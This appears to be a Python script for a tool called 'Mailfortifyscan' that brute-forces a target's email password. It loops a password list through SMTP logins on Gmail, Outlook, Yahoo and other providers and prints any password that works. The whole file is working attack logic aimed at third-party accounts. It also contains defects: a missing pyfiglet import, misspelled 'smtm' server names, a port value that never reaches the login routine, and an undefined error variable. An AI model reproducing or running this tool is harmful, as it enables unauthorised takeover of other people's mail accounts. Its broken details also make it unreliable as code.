import smtplib
import os,sys
import time,random
import threading
import argparse

purple = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
default = '\033[0m'
underline = '\033[4m'
orange = '\033[33m'

serv = None
port = 587

os.chdir('modules/')
parser = argparse.ArgumentParser(description="Framework fortifyscan")
parser.add_argument('login', help='Target email')
parser.add_argument('password', help='Password list')
args = parser.parse_args()

if args.login or args.password:
	login = args.login
	password_list = args.password
	if os.path.exists(password_list):
		file = open(password_list,'r')
	else:
		print(red+'File not exist'+default)
		sys.exit(1)
def banner():
	font = pyfiglet.Figlet()
	ascii_art1 = font.renderText("Mailfortifyscan")
	print(ascii_art1)
    
def clear():
	os.system('clear')

def check_mail():
	global serv
	clear()
	banner()
	print(blue+'Enter servese smtp:'+default)
	print(purple+"""
		1) Gmail
		2) Outlook
		3) Yahoo
		4) At&T
		5) Mail.com
		6) Comcast
		7) By hand
		"""+default)
	ServerSmtp = input(green+'fortifyscan»Mail»ServerSmtp»'+default)
	if int(ServerSmtp) == 1:
		serv = 'smtp.gmail.com'
		port = 465
	elif int(ServerSmtp) == 2:
		serv = 'smtp-mail.outlook.com'
		port = 587
	elif int(ServerSmtp) == 3:
		serv = 'smtm.mail.yahoo.com'
		port = 587
	elif int(ServerSmtp) == 4:
		serv = 'smtm.mail.att.net'
		port = 465
	elif int(ServerSmtp) == 5:
		serv = 'smtm.mail.com'
		port = 587
	elif int(ServerSmtp) == 6:
		serv = 'smtm.comcast.com'
		port = 587
	elif int(ServerSmtp) == 7:
		serv = input('Enter smtp server (Exemple:smtp.gmail.com)')
		port = input('Enter port smtp server (Default port: 587)')
	else:
		print('Error ')
		sys.exit(1)

def brut():
	print(red+'Start brutforse'+default)
	try:
		smtp = smtplib.SMTP(str(serv), int(port))
		smtp.ehlo()
		smtp.starttls()
	except:
		print(error)
	for line in file:
		try:
			passw = line.strip('\r\n')
			smtp.login(login, passw)
			print(yellow+time.ctime()+blue+' Work mail login-> '+yellow+login+blue+' password-> '+yellow+passw)
			break
			sys.exit(1)
		except:
			print(red + time.ctime() + default + ' Not work ->'+default+login+default+'Password ->'+default+passw)

check_mail()
t1 = threading.Thread(target=brut)
t1.start()
